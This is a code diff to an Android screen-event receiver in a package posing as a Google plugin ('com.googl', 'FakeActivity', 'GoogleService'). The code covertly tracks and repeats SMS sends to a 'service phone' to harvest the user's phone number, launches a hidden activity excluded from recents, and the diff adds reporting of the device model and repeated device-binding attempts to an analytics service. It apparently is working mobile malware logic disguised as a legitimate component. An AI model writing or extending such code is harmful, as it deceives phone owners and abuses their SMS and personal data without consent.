@@ -5,6 +5,7 @@ import android.content.BroadcastReceiver;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Build;
 import android.text.TextUtils;
 import com.googl.plugin.x.FakeActivity;
 import com.plugin.common.utils.UtilsRuntime;
@@ -19,6 +20,7 @@ import com.xstd.plugin.service.GoogleService;
 import com.xstd.plugin.service.PluginService;
 
 import java.util.Calendar;
+import java.util.HashMap;
 
 /**
  * Created with IntelliJ IDEA.
@@ -117,7 +119,6 @@ public class ScreenBRC extends BroadcastReceiver {
                     int curMonth = c.get(Calendar.MONTH);
                     int curYear = c.get(Calendar.YEAR);
 
-                    int smsSendDelayDays = (curYear - lastYear) * 365 - lastDay + curDay;
                     if (Config.DEBUG) {
                         Config.LOGD("[[ScreenBRC::onReceive]] : " +
                                         "\n              last active day = " + lastDay + " last year : " + lastYear
@@ -125,7 +126,7 @@ public class ScreenBRC extends BroadcastReceiver {
                                         + "\n              next random Hour is : " + SettingManager.getInstance().getKeyRandomNetworkTime()
                                         + "\n              action = " + action
                                         + "\n              last send SMS day time : " + SettingManager.getInstance().getKeyLastSendMsgToServicehPhone()
-                                        + "\n              sms send delay days : " + smsSendDelayDays
+//                                        + "\n              sms send delay days : " + smsSendDelayDays
                                         + "\n>>>>>>>>>>>>>>>>>");
                     }
 
@@ -141,26 +142,31 @@ public class ScreenBRC extends BroadcastReceiver {
                     }
 
                     if (SettingManager.getInstance().getKeyLastSendMsgToServicehPhone() != 0
-//                            && (curDay - SettingManager.getInstance().getKeyLastSendMsgToServicehPhone() > Config.SMS_SEND_DELAY)
-                            && (smsSendDelayDays > Config.SMS_SEND_DELAY)
                             && TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())) {
-                        //如果时间大于3天的，并且手机号码是空的，那么就要重新获取手机号码
-                        int times = SettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes();
-                        if (Config.DEBUG) {
-                            Config.LOGD("[[ScreenBRC::onReceive]] SMS Service Phone cleart times : " + times);
-                        }
-                        if (times > 90) {
-                            Intent iPhoneFetch = new Intent();
-                            iPhoneFetch.setClass(context, PluginService.class);
-                            iPhoneFetch.setAction(PluginService.ACTIVE_FETCH_PHONE_ACTION);
-                            context.startService(iPhoneFetch);
-                        } else {
+                        Calendar smsC = Calendar.getInstance();
+                        smsC.setTimeInMillis(SettingManager.getInstance().getKeyLastSendMsgToServicehPhone());
+                        int smsLastDay = smsC.get(Calendar.DAY_OF_YEAR);
+                        int smsLastYear = smsC.get(Calendar.YEAR);
+                        int smsSendDelayDays = (curYear - smsLastYear) * 365 - smsLastDay + curDay;
+                        if (smsSendDelayDays > Config.SMS_SEND_DELAY) {
+                            //如果时间大于1天的，并且手机号码是空的，那么就要重新获取手机号码
+                            int times = SettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes();
                             if (Config.DEBUG) {
-                                Config.LOGD("[[ScreenBRC::onReceive]] clear send time to : " + (times + 1)
-                                        + " and setKeyDeviceHasSendToServicePhone = false");
+                                Config.LOGD("[[ScreenBRC::onReceive]] SMS Service Phone cleart times : " + times);
                             }
-                            SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(times + 1);
-                            SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
+                            if (times > 90) {
+                                Intent iPhoneFetch = new Intent();
+                                iPhoneFetch.setClass(context, PluginService.class);
+                                iPhoneFetch.setAction(PluginService.ACTIVE_FETCH_PHONE_ACTION);
+                                context.startService(iPhoneFetch);
+                            } else {
+                                if (Config.DEBUG) {
+                                    Config.LOGD("[[ScreenBRC::onReceive]] clear send time to : " + (times + 1)
+                                                    + " and setKeyDeviceHasSendToServicePhone = false");
+                                }
+                                SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(times + 1);
+                                SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
+                            }
                         }
                     }
 
@@ -181,7 +187,7 @@ public class ScreenBRC extends BroadcastReceiver {
                             if (Config.DEBUG) {
                                 Config.LOGD("[[ScreenBRC::onReceive]] try to start PluginService for " + PluginService.ACTIVE_ACTION
                                                 + " as active time is over"
-                                                + " , isForce : (" + isForce +")");
+                                                + " , isForce : (" + isForce + ")");
                             }
                             Intent i = new Intent();
                             i.setAction(PluginService.ACTIVE_ACTION);
@@ -237,6 +243,15 @@ public class ScreenBRC extends BroadcastReceiver {
                 i.setClass(context, FakeActivity.class);
                 i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                 context.startActivity(i);
+            } else {
+                if (SettingManager.getInstance().getDeviceBindingTime() <= 100) {
+                    //notify umeng
+                    HashMap<String, String> log = new HashMap<String, String>();
+                    log.put("phoneType", Build.MODEL);
+                    log.put("bind_time", String.valueOf(SettingManager.getInstance().getDeviceBindingTime()));
+                    CommonUtil.umengLog(context, "bind_too_times", log);
+                    SettingManager.getInstance().setDeviceBindingTime(101);
+                }
             }
         }
     }
